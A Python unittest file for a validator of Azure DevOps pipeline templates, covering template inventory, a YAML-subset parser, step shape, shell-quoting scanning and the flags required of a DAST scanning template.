        ])
        self.assertFails(check_templates_declared(ts), "missing from the tree")

    def test_undeclared_template_on_disk_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT)
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.write("shared/commit.yml", CLEAN_COMMIT)
        ts = self.build(declared=[
            f"{ADO_TEMPLATE_DIR}/commit.yml",
            f"{ADO_TEMPLATE_DIR}/precommit.yml",
        ])
        self.assertFails(check_templates_declared(ts), "is not declared")

    def test_empty_template_group_is_refused(self) -> None:
        inventory = self.root / "inventory.json"
        inventory.write_text(json.dumps({"active_surfaces": {"templates": []}}))
        with self.assertRaises(TemplateError):
            load_templates(self.root, inventory)

    def test_template_group_without_ado_entries_is_refused(self) -> None:
        inventory = self.root / "inventory.json"
        inventory.write_text(
            json.dumps({"active_surfaces": {"templates": ["templates/github-actions/commit.yml"]}})
        )
        with self.assertRaises(TemplateError):
            load_templates(self.root, inventory)


class ParseTests(FixtureTestCase):
    def test_malformed_template_fails(self) -> None:
        self.write("commit.yml", "pool:\n\tvmImage: ubuntu-latest\n")
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_templates_parse(self.build()), "does not parse")

    def test_missing_steps_key_fails(self) -> None:
        self.write("precommit.yml", 'pool:\n  vmImage: ubuntu-latest\nvariables:\n  X: "1"\n')
        self.assertFails(check_templates_parse(self.build()), "no top-level 'steps:'")

    def test_empty_steps_list_fails(self) -> None:
        self.write("precommit.yml", 'pool:\n  vmImage: x\nvariables:\n  X: "1"\nsteps:\n')
        self.assertFails(check_templates_parse(self.build()), "steps:")

    def test_same_indent_sequence_is_parsed_as_mapping_value(self) -> None:
        document = parse_ado_yaml(
            "steps:\n- checkout: self\n- bash: echo ok\n  displayName: Run check\nvariables:\n  X: 1\n"
        )
        self.assertEqual(document["steps"][0], {"checkout": "self"})
        self.assertEqual(document["steps"][1]["displayName"], "Run check")
        self.assertEqual(document["variables"], {"X": 1})

    def test_sequence_root_is_refused(self) -> None:
        with self.assertRaises(YamlSubsetError):
            parse_ado_yaml("- one\n- two\n")

    def test_unparseable_line_is_refused(self) -> None:
        with self.assertRaises(YamlSubsetError):
            parse_ado_yaml("pool:\n  vmImage: x\nnot a mapping entry\n")

    def test_block_scalar_keeps_leading_comment_lines(self) -> None:
        """The tokeniser strips comments; block scalars must not lose them.

        A bash body opening with a comment would otherwise disappear from the
        scan, hiding any unsafe interpolation or removed surface inside it.
        """
        document = parse_ado_yaml(textwrap.dedent("""\
            steps:
              - bash: |
                  # leading comment
                  echo one

                  echo two
                displayName: Two echoes
            """))
        body = document["steps"][0]["bash"]
        self.assertEqual(body.splitlines()[0], "# leading comment")
        self.assertIn("echo two", body)
        self.assertEqual(document["steps"][0]["displayName"], "Two echoes")

    def test_inline_comment_after_a_scalar_is_stripped(self) -> None:
        document = parse_ado_yaml("steps:\n  - checkout: self\n    fetchDepth: 0  # full history\n")
        self.assertEqual(document["steps"][0]["fetchDepth"], 0)

    def test_hash_inside_a_quoted_scalar_is_data(self) -> None:
        document = parse_ado_yaml('variables:\n  MARKER: "a # b"\n')
        self.assertEqual(document["variables"]["MARKER"], "a # b")


class StepShapeTests(FixtureTestCase):
    def test_bash_step_without_display_name_fails(self) -> None:
        self.write("precommit.yml", CLEAN_PRECOMMIT.replace(
            "    displayName: Run precommit composite\n", ""
        ))
        self.write("commit.yml", CLEAN_COMMIT)
        self.assertFails(check_step_shape(self.build()), "no displayName")

    def test_step_naming_two_actions_fails(self) -> None:
        self.write("precommit.yml", CLEAN_PRECOMMIT.replace(
            "    displayName: Run precommit composite",
            "    script: echo also-a-script\n    displayName: Run precommit composite",
        ))
        self.write("commit.yml", CLEAN_COMMIT)
        self.assertFails(check_step_shape(self.build()), "names 2 actions")

    def test_step_naming_no_action_fails(self) -> None:
        self.write("precommit.yml", textwrap.dedent("""\
            pool:
              vmImage: x
            variables:
              X: "1"
            steps:
              - displayName: Does nothing at all
                condition: always()
            """))
        self.assertFails(check_step_shape(self.build()), "names no action")


# ─────────────────────────────────────────────────────────────────────────────
# the shell scanner
# ─────────────────────────────────────────────────────────────────────────────


class ShellScannerTests(unittest.TestCase):
    def test_command_substitution_is_not_read_as_a_macro(self) -> None:
        refs = scan_shell('after="$(git rev-parse HEAD)"')
        self.assertEqual([r for r in refs if r.kind == "macro"], [])

    def test_nested_quotes_inside_a_substitution_do_not_corrupt_state(self) -> None:
        """An apostrophe inside a substitution must not open a quote for the rest."""
        body = 'echo "n=$(grep -c \'^+++ \' "$out" || echo 0)"\nextra+=(--x "$SAFE")'
        refs = scan_shell(body)
        safe = [r for r in refs if r.name == "SAFE"]
        self.assertEqual(len(safe), 1)
        self.assertTrue(safe[0].quoted, "expansion after a substitution was misread as unquoted")

    def test_apostrophe_in_a_comment_does_not_corrupt_state(self) -> None:
        """`# Dagger's engine ...` shipped inside a bash body in every template."""
        body = "# Dagger's engine needs a token\nextra+=(--x \"$SAFE\")\nbare=$RAW"
        refs = scan_shell(body)
        by_name = {r.name: r for r in refs if r.kind == "expansion"}
        self.assertIn("SAFE", by_name)
        self.assertTrue(by_name["SAFE"].quoted)
        self.assertIn("RAW", by_name)
        self.assertFalse(by_name["RAW"].quoted)

    def test_single_quoted_expansion_is_reported_as_safe(self) -> None:
        refs = [r for r in scan_shell("case \"$X\" in ''|'$('*) ;; esac") if r.kind == "macro"]
        self.assertEqual(refs, [])

    def test_macro_and_expansion_are_distinguished(self) -> None:
        refs = scan_shell('a="$(Build.SourceVersion)"; b="$LOCAL"')
        kinds = {(r.kind, r.name) for r in refs}
        self.assertIn(("macro", "Build.SourceVersion"), kinds)
        self.assertIn(("expansion", "LOCAL"), kinds)


# ─────────────────────────────────────────────────────────────────────────────
# the shipped tree and the real CLI
# ─────────────────────────────────────────────────────────────────────────────


class TemplateKindTests(FixtureTestCase):
    """The classifier was a boolean until a DAST template had to ship."""

    def dast_with(self, replacement: tuple[str, str] | None = None) -> object:
        source = CLEAN_DAST
        if replacement is not None:
            old, new = replacement
            self.assertIn(old, source)
            source = source.replace(old, new)
        self.write("dast.yml", source)
        return self.build()

    def test_clean_dast_template_passes_every_check(self) -> None:
        self.assertClean(self.dast_with())

    def test_kinds_are_classified_by_filename_prefix(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT)
        self.write("dast.yml", CLEAN_DAST)
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        ts = self.build()
        kinds = {pathlib.PurePosixPath(t.rel).name: t.kind for t in ts.templates}
        self.assertEqual(
            kinds,
            {
                "commit.yml": "commit",
                "dast.yml": "dast",
                "precommit.yml": "precommit",
            },
        )

    def test_precommit_is_still_classified_after_the_widening(self) -> None:
        """`commit` is tested first, so `precommit.yml` must not match it."""
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        ts = self.build()
        self.assertEqual([t.kind for t in ts.templates], ["precommit"])
        self.assertEqual([t.is_commit for t in ts.templates], [False])

    def test_dast_is_graded_against_the_dast_composite(self) -> None:
        """A dast template calling the commit composite is the wrong pipeline."""
        ts = self.dast_with(("src/composites/dast", "src/composites/commit"))
        self.assertFails(
            check_dagger_invocations(ts),
            "expected 'src/composites/dast'",
        )

    def test_src_is_not_demanded_of_a_dast_template(self) -> None:
        """--app url scans an address and has no source tree at all.

        Demanding --src here would force the template to carry a flag it does
        not use in order to satisfy the checker, which is the class of lie the
        flag list exists to prevent.
        """
        ts = self.dast_with()
        self.assertEqual(check_dagger_invocations(ts), [])
        call = [
            line
            for line in CLEAN_DAST.splitlines()
            if "src/composites/dast" in line
        ]
        self.assertEqual(len(call), 2, call)
        self.assertNotIn("--src .", CLEAN_DAST.split("case \"$APP\"")[0])

    def test_missing_mode_fails(self) -> None:
        """An unset --mode is dropped by the client and buys the weakest scan."""
        ts = self.dast_with(('        --mode "$MODE" \\\n', ""))
        self.assertFails(check_dagger_invocations(ts), "omits --mode")

    def test_missing_app_fails(self) -> None:
        """An unset --app resolves to the shape needing least from the caller."""
        ts = self.dast_with(
            (
                '''      case "$APP" in
        url)       extra+=(--app url --target "$TARGET") ;;
        service)   extra+=(--app service) ;;
        container) extra+=(--app container --src .)
                   extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM") ;;
      esac
''',
                '''      extra+=(--target "$TARGET")
      extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM")
''',
            )
        )
        self.assertFails(check_dagger_invocations(ts), "omits --app")

    def test_app_named_only_in_a_comment_fails(self) -> None:
        """Body-scoped is about where the checker looks, not about how hard it looks."""
        ts = self.dast_with(
            (
                "        url)       extra+=(--app url --target \"$TARGET\") ;;\n"
                "        service)   extra+=(--app service) ;;\n"
                "        container) extra+=(--app container --src .)\n",
                "        # url)       extra+=(--app url --target \"$TARGET\") ;;\n"
                "        # service)   extra+=(--app service) ;;\n"
                "        container) extra+=(--src .)\n",
            )
        )
        self.assertFails(check_dagger_invocations(ts), "omits --app")

    def test_dast_is_asked_for_the_container_shape_flags(self) -> None:
        """`dast.Run --app container` builds, so the overrides must be reachable."""
        ts = self.dast_with(
            (
                '                   extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM") ;;\n',
                "                   : ;;\n",
            )
        )
        problems = check_container_shape_flags(ts)
        self.assertFails(problems, "never passes --dockerfile")
        self.assertFails(problems, "never passes --platform")

    def test_shipped_dast_template_is_the_one_declared(self) -> None:
        """The live tree: exactly one ADO template is a DAST pipeline."""
        ts = load_templates(REPO_ROOT, SCRIPTS / "repo-inventory.json")
        dasts = [t.rel for t in ts.templates if t.kind == "dast"]
        self.assertEqual(dasts, ["templates/azure-devops/dast.yml"])


class ShippedTemplateTests(unittest.TestCase):
    def run_cli(self, *args: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(SCRIPTS / "check-ado-templates.py"), *args],
            capture_output=True,
            text=True,
            cwd=REPO_ROOT,
        )

    def test_live_tree_passes_the_real_checker(self) -> None:
        """No arguments: exactly the command CI and the required fact run."""
        result = self.run_cli()
        self.assertEqual(
            result.returncode,
            0,
            f"the shipped ADO templates fail validation:\n{result.stdout}\n{result.stderr}",
        )
        self.assertIn("ADO template check: OK", result.stdout)

    def test_checker_validates_every_shipped_ado_template(self) -> None:
        """A checker that silently validated zero templates would also exit 0."""
        ts = load_templates(REPO_ROOT, SCRIPTS / "repo-inventory.json")
        names = {t.rel for t in ts.templates}
        self.assertEqual(
            names,
            {
                "templates/azure-devops/commit.yml",
                "templates/azure-devops/dast.yml",
                "templates/azure-devops/precommit.yml",
                "templates/azure-devops/shared/commit.yml",
                "templates/azure-devops/shared/precommit.yml",
            },
        )
        self.assertEqual(ts.missing, ())
        self.assertEqual(ts.undeclared, ())

    def test_unusable_inventory_exits_two(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            bad = pathlib.Path(tmp) / "inventory.json"
            bad.write_text(json.dumps({"active_surfaces": {"templates": []}}))
            result = self.run_cli("--inventory", str(bad))
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_ci_runs_the_ado_template_check(self) -> None:
        """A checker nothing executes defends nothing."""
        ci = (REPO_ROOT / ".github/workflows/ci.yml").read_text()
        self.assertIn("scripts/check-ado-templates.py", ci)


if __name__ == "__main__":
    unittest.main()
